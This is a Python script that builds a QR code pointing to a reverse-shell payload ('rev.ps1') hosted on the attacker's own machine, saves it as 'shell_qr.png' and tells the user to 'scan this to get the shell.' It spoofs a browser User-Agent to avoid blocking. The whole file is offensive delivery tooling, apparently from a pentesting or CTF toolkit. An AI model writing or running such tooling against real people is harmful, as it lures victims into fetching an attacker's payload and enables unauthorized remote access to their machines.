import socket
import urllib.request
import urllib.parse
import os
import sys

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def main():
    ip = get_ip()
    port = 8000
    payload_file = "rev.ps1"
    
    # Allow override via args
    if len(sys.argv) > 1:
        payload_url = sys.argv[1]
    else:
        payload_url = f"http://{ip}:{port}/{payload_file}"
        
    print(f"DUDE: Targeting Payload URL -> {payload_url}")

    # Encode the URL for the API
    encoded_data = urllib.parse.quote(payload_url)
    api_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={encoded_data}"

    output_file = "shell_qr.png"

    print(f"DUDE: Generating QR code via {api_url}...")

    try:
        # User-Agent to avoid some blocking
        req = urllib.request.Request(
            api_url, 
            data=None, 
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
            }
        )
        
        with urllib.request.urlopen(req) as response, open(output_file, 'wb') as out_file:
            data = response.read()
            out_file.write(data)
            
        print(f"DUDE: QR code successfully saved to {os.path.abspath(output_file)}")
        print("DUDE: Scan this to get the shell.")
    except Exception as e:
        print(f"DUDE: Failed to fetch QR code. Error: {e}")

if __name__ == "__main__":
    main()
